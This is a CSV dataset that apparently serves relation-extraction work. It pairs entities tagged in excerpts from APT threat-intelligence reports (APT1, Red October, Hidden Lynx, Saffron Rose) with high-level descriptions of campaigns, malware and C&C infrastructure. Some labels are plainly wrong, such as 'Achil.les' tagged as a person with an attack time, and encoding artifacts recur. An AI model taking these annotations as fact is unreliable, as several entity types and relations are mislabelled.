"FileName","RelationType","Entity1Mention","Entity1Type","Entity2Mention","Entity2Type","Context"
"The_Monju_Incident","hasattacklocation","The Japanese Atomic Energy Agency","ORG","South Korea","GPE","The Japanese Atomic Energy Agency is investigating further . The attack appears to have been the result of the attackers having compromised the ‘ GOM Player ’ update server and having it act as a ‘ watering hole ’ , meaning that machines which access the site are delivered malware . Gom Player originates in South Korea and in some parts of Asia it is a popular alternative to Windows Media Player . "
"RAP002_APT1_Technical_backstage.1.0","hasattacklocation","CSIRT","ORG","Luxembourg","GPE","This report has been created by Malware.lu CERT , the first private Computer Security Incident Response Team ( CSIRT ) located in Luxembourg and itrust consulting S.A.R.L , a Luxembourg based company specialising in formation system security . "
"rpt-operation-saffron-rose","hasproduct","IntelRS.exe","ORG","AppTransferWiz.DLL","PRODUCT","State is maintained between the stealer component IntelRS.exe and the FTP component AppTransferWiz . DLL using a file from the FTP server ¡ ° sqlite3.dll¡± , as well as a global atom ¡ ° SQLiteFinish¡±. IntelRS.exe waits in an indefinite loop , until AppTransferWiz . DLL defines this state . "
"winnti-more-than-just-a-game-130410","indicates","Realited","PRODUCT","first","ORDINAL","Checking detection logs of the anti - virus on the suspected date of infection ( 05.09.2012 ) showed that there was a single detection right before tcprelay service first start . Part of the antivirus quarantine log . We recovered the PDF document called ¡ ° Transmission with Steps , Realited and Compressed.pdf¡± from the anti - virus quarantine and prepared to find an exploit inside . "
"hidden_lynx","hasattacktime","VOHO","ORG","July 10","DATE","The scale and targeted nature of the VOHO campaign set it apart from watering - hole attacks observed in the past . The group first adopted this technique in December 2011 when an exploit for the Oracle Java SE Rhino Script Engine Remote Code Execution Vulnerability ( CVE-2011 - 3544 ) was leveraged to distribute their payloads . As a result of their success , many other strategic compromises have been adopted by other attack groups , as seen in a notable attack targeting iOS developers earlier in 2013 which impacted employees at Facebook , Apple and Twitter . In the VOHO campaign , ten legitimate websites were strategically compromised . The attackers carefully selected these websites based on the likelihood that the intended target(s ) would visit them during the exploit delivery phase . The attackers likely pre - determined who visited the watering - hole in advance of the distribution phase of attack . This could easily be achieved by examining the access logs of compromised Web servers . The categories of websites compromised were both regional and industry - specific in nature and targeted the following key areas illustrated in Figure 5 . Timeline of activity The VOHO watering - hole distributed remote access Trojans in two phases . In phase one of the attack , an Internet Explorer zero - day vulnerability , the Microsoft XML Core Services CVE-2012 - 1889 Remote Code Execution Vulnerability ( CVE-2012 - 1889 ) , was leveraged . On July 10 , Microsoft introduced the patch for CVE-2012 - 1889 and activity at the watering - hole ceased . "
"15-2013-youonlyclicktwice","hasattacklocation","FinSpy","ORG","Latvia","GPE","Taken together , FinSpy servers are currently , or have been present , in 25 countries . Australia , Bahrain , Bangladesh , Brunei , Canada , Czech Republic , Estonia , Ethiopia , Germany , India , Indonesia , Japan , Latvia , Malaysia , Mexico , Mongolia , Netherlands , Qatar , Serbia , Singapore , Turkmenistan , United Arab Emirates , United Kingdom , United States , Vietnam . "
"hidden_lynx","hasattacklocation","Naid","ORG","Hong Kong","GPE","This campaign provided the first indications that the group was using both Moudoor and Naid to attack targets and share C&C infrastructure . Along with this , early links to the attacks on Bit9 began to emerge . The timeline of this activity is shown in Figure 16 . In these campaigns , the Hidden Lynx group made heavy use of infrastructure in Hong Kong , with the exception of yahooeast.net . "
"rpt-operation-saffron-rose","hasattacklocation","Basij","ORG","Iran","GPE","This model is consistent with the Basij¡¯s recruitment of paramilitary volunteer hackers to ¡ ° engage in less complex hacking or infiltration operations¡± leaving the more technical operations to entities over which they have increasingly direct control.13 As such , the capabilities of threat actors operating from Iran have traditionally been considered limited.14 However , the ¡ ° Shamoon¡± attacks , which wiped computers in Saudi Arabia and Qatar , indicate an improvement in capabilities.15 And unsurprisingly , Iran has reportedly increased its efforts to improve offensive capabilities after being targeted by Stuxnet and Flame.16 1 HP Security Research . "
"hidden_lynx","hasattacklocation","Moudoor","ORG","Hong Kong","GPE","This campaign provided the first indications that the group was using both Moudoor and Naid to attack targets and share C&C infrastructure . Along with this , early links to the attacks on Bit9 began to emerge . The timeline of this activity is shown in Figure 16 . In these campaigns , the Hidden Lynx group made heavy use of infrastructure in Hong Kong , with the exception of yahooeast.net . "
"Operation_EphemeralHydra","indicates","9002","CARDINAL","RAT","PRODUCT","The older traditional version of 9002 RAT had a static 4 - byte identifier at offset 0 in the callback network traffic . "
"securelist.com-Red October Detailed Malware Description 4 Second Stage of Attack","indicates","ServiceMainand WinMessage","PRODUCT","two","CARDINAL","The file is a PE DLL file without two exported functions ( ServiceMainand WinMessage ) , compiled with Microsoft Visual Studio 2010 . "
"rpt-operation-saffron-rose","hasattacklocation","the NCPH Hacking Group","ORG","Iran","GPE","Dunham , K. & Melnick , J. ¡ ° ¡ ¯Wicked Rose¡¯ and the NCPH Hacking Group¡±. Wikipedia . ¡ ° Network Crack Program Hacker Group¡±.6 Dunham , K. & Melnick , J. ¡ ° ¡ ¯Wicked Rose¡¯ and the NCPH Hacking Group¡±.7 Blasco , J. ¡ ° The connection between the Plugx Chinese gang and the latest Internet Explorer Zeroday¡±. September 2012.8 Key . ¡ ° Honker Union of China to launch network attacks against Japan is a rumor¡±. September 2010.9 OpenNet Initiative . ¡ ° After the Green Movement : Internet Controls in Iran 2009 . "
"The-Eye-of-the-Tiger2","hasattacklocation","8uFTP","ORG","Chinese-Taiwan","GPE","Information relating to the tools used by the attackers has been leveraged for attribution : Several Chinese vulnerability scanners have been launched against targets ; Several Chinese tools have been used and found on the c&c servers of the attackers : 8uFTP , a Chinese version of calc.exe , etc . ; Two of the used RATs have been developed by the same developers : CT RAT and PittyTiger RAT . The controllers for these RATs show Chinese language ; Several binaries used by the attackers show either “ Chinese -China ” or “ Chinese - Taiwan ” language ID in their resources ; Adecoy Word document has been found , written in Chinese language ; The IP addresses used for the hosting of the c&c domains are mainly located in Taipei ( Taïwan ) and Hong Kong City ( Hong Kong SpecialAdministrative Region , PRC ): All the items listed in this part are strong indicators that the attackers might be Chinese . "
"icefog","targets","Icefog","ORG","WinHelp","PRODUCT","WinHLP.Agent.d Let¡¯s take a quick look at an example of how the Icefog attackers abused the provided WinHelp functionality by examining the relevant custom macros , API calls and shellcode . "
"Securelist_RedOctober","hasproduct","Cisco","ORG","MS Word","PRODUCT","Beside traditional attack targets ( workstations ) , the system is capable of stealing data from mobile devices , such as smartphones ( iPhone , Nokia , Windows Mobile ) ; dumping enterprise network equipment configuration ( Cisco ) ; hijacking files from removable disk drives ( including already deleted files via a custom file recovery procedure ) ; stealing e - mail databases from local Outlook storage or remote POP / IMAP server ; and siphoning files from local network FTP servers . We have observed the use of at least three different exploits for previously known vulnerabilities : CVE-2009 - 3129 ( MS Excel ) , CVE-2010 - 3333 ( MS Word ) and CVE-2012 - 0158 ( MS Word ) . The earliest known attacks used the exploit for MS Excel and took place in 2010 and 2011 , while attacks targeting the MS Word vulnerabilities appeared in the summer of 2012 . "
"Securelist_RedOctober","hasattacklocation","Command & Control","ORG","Russia","GPE","How many Command & Control servers are there ? Did Kaspersky Lab conduct any forensic analysis on them ? During our investigation , we uncovered more than 60 domain names used by the attackers to control and retrieve data from the victims . The domain names map to several dozen IPs located mostly in Russia and Germany . "
"2013-9","hasattacktime","Achil.les","PERSON","one year","DATE","The Russian economy is heavily dependent on the oil & gas industries , with 62.7 % of its economy being service based industries in 2010.74 Many economists have pointed to oil and gas prices as the Achil.les heel of the Russian economy.757677 This was made evident in 2008 when oil prices plummeted ( as seen in the figure below ) , sending the Russian economy spiraling into a recession . Prices hit a low in 2009 , one year before Deepwater Horizon and at a time when reports were also stating that the overall output of Russian oil for 2010 was projected to decline.78 "
"2013-9","hasattacktime","APT1","ORG","over half a decade","DATE","They even went so far as to report the building which they believed APT1 was operating out of , and unmask three operators . UglyGorilla , DOTA , and SuperHard . giving possible real names , online personas and other identifying infor.mation about them . APT1 operated over half a decade at least , stealing ¡ ° hundreds of terabytes of data from at least 141 organizations,¡± often conducting such operations in parallel . "
"2013-9","indicates","Mirage","PRODUCT","the Sin Digoo Affair.5","WORK_OF_ART","Dell Secure.works which authored the Mirage Report also authored a piece known as the Sin Digoo Affair.5 The connecting factor between the Sin Digoo affair and Mirage was that an operator reused several email addresses ( jeno_1980@hotmail.com & king_public@hotmail.com ) and infrastructure between them . "
"NS-Unveiling-an-Indian-Cyberattack-Infrastructure_FINAL_Web","hasproduct","Visual Basic","ORG","¡°Yash¡±","PRODUCT","First , many of the Visual Basic keyloggers contained the name ¡ ° Yash¡± , which might be an abbreviation for several Indian names . "
"The Syrian Malware House of Cards - Securelist","hasattacklocation","Skype","ORG","United States","GPE","The victims infected when accessing the hacked forums and social networking sites tend to be ordinary users or activistshey were , or specific targets if they receive the malware via email , Skype , or messages on social networking sites . The victims are also located outside Syria . We have seen victims of Syrian­based malware in : 1 . Turkey 2 . Saudi Arabia 3 . Lebanon 4 . Palestine 5 . United Arab Emirates 6 . Israel 7 . Morocco 8 . France 9 . United States "
"Mandiant_APT1_Report","hasattacklocation","24   PLa","ORG","China","GPE","The close proximity of these amenities supports the contention that Unit 61398 occupies a high - level position in the PLA organizational hierarchy ( see Figure 1 : Unit 61398¡¯s positions within the PLA).24 PLa unit 61398 and state - owned enterprise China telecom are Co - building Computer network operations Infrastructure Mandiant found an internal China Telecom document online that provides details about the infrastructure provided to Unit 61398 . "
